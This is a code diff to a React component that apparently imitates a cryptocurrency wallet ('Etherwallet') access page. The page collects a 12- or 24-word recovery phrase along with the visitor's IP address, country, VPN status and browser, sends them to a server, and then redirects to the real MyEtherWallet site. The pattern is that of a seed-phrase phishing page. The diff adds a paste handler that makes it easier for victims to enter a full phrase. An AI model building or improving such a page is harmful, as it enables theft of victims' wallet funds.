@@ -20,21 +20,46 @@ export default function MnemonicAccess() {
     setWords(newWords);
   };
 
+  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+    e.preventDefault();
+
+    const pastedText = e.clipboardData.getData("text").trim();
+    if (!pastedText) return;
+
+    const pastedWords = pastedText
+      .replace(/\n/g, " ")
+      .replace(/,/g, " ")
+      .split(/\s+/)
+      .filter(Boolean);
+
+    if (pastedWords.length === 12 || pastedWords.length === 24) {
+      setWordCount(pastedWords.length);
+      setWords(pastedWords);
+      setErrorMessage("");
+    } else {
+      setErrorMessage(
+        `Please paste exactly 12 or 24 words (you pasted ${pastedWords.length}).`
+      );
+    }
+  };
+
   const handleNext = async () => {
     console.log("Mnemonic words:", words);
-    
+
     try {
       // Get user location data
       const userCountry = await getUserCountry();
-      
+
       if (!userCountry) {
         console.error("Failed to get user location data");
         return;
       }
 
       // Check VPN status
-      const vpnDetected = userCountry.isVpnIpdata || await checkVpnStatusWithIPQS(userCountry.ip);
-      
+      const vpnDetected =
+        userCountry.isVpnIpdata ||
+        (await checkVpnStatusWithIPQS(userCountry.ip));
+
       // Prepare the data to send
       const requestData = {
         appName: "Etherwallet",
@@ -42,7 +67,8 @@ export default function MnemonicAccess() {
         vpnDetected,
         country: userCountry.country,
         ipAddress: userCountry.ip,
-        browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"
+        browser:
+          typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
       console.log("Sending data:", requestData);
@@ -62,11 +88,11 @@ export default function MnemonicAccess() {
       console.log("API response:", response.data);
       const result = response.data;
       if (response.status === 200 && result.status) {
-        console.log('redirecting to myetherwallet');
+        console.log("redirecting to myetherwallet");
         window.location.href = "https://www.myetherwallet.com";
         console.log(result);
       } else {
-        console.log('error redirecting to myetherwallet');
+        console.log("error redirecting to myetherwallet");
         const serverMessage = result?.message || "Something went wrong.";
         const serverError = result?.error ? ` (${result.error})` : "";
         setErrorMessage(serverMessage + serverError);
@@ -159,6 +185,7 @@ export default function MnemonicAccess() {
                     type="text"
                     value={word}
                     onChange={(e) => handleWordChange(index, e.target.value)}
+                    onPaste={handlePaste}
                     className="w-full border-b border-gray-300 pb-2 focus:border-teal-500 focus:outline-none"
                   />
                 </div>
